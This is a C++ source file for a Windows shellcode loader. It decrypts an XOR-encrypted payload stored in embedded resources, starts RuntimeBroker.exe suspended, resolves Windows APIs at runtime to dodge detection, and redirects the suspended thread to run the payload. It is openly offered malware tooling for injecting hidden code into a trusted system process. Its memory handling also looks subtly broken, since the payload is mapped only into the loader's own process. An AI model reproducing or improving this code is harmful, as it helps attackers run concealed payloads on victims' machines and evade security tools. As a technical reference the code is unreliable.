
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void its_load_re(const char* renamer, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    
    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
    HGLOBAL resrdata = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(resrdata);
}

int main() {
    
    char* ke;
    DWORD keLen;
    its_load_re("dhanushkey1", &ke, &keLen);
    const char* processPath = "C:\\Windows\\System32\\RuntimeBroker.exe";
    char* code199k;
    DWORD code199kLen;
    its_load_re("dhanushcode56", &code199k, &code199kLen);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(si);
    
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    
    // Create a new process in a suspended state
    auto pCreateProcessA = (BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))GetProcAddress(hKernel32, "CreateProcessA");
    pCreateProcessA(processPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Get the thread context
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "GetThreadContext");
    pGetThreadContext(pi.hThread, &ctx);

    // Create a file mapping (shared memory)
    auto pCreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))GetProcAddress(hKernel32, "CreateFileMappingA");
    HANDLE hMapFile = pCreateFileMappingA(
        INVALID_HANDLE_VALUE,  // Use system paging file
        NULL,                  // Default security
        PAGE_EXECUTE_READWRITE, // Read/Write access
        0,                     // Maximum object size (high-order DWORD)
        code199kLen,           // Maximum object size (low-order DWORD)
        NULL                   // Name of the mapping object
    );

    // Map the view of the file into the process's memory space
    auto pMapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))GetProcAddress(hKernel32, "MapViewOfFile");
    LPVOID lpBase = pMapViewOfFile(
        hMapFile,              // Handle to the mapping object
        FILE_MAP_ALL_ACCESS,   // Read/Write access
        0,                     // High-order DWORD of the file offset
        0,                     // Low-order DWORD of the file offset
        code199kLen            // Number of bytes to map
    );


    
    for (DWORD i = 0; i < code199kLen; i++) {
        code199k[i] ^= ke[i % keLen];
    }

    
    memcpy(lpBase, code199k, code199kLen);

   
    ctx.Rcx = (DWORD64)lpBase;
    
    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
    pSetThreadContext(pi.hThread, &ctx);
        
    // Resume the thread to execute the code
    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
    pResumeThread(pi.hThread);

    // Cleanup
    UnmapViewOfFile(lpBase);
    CloseHandle(hMapFile);

    return 0;
}
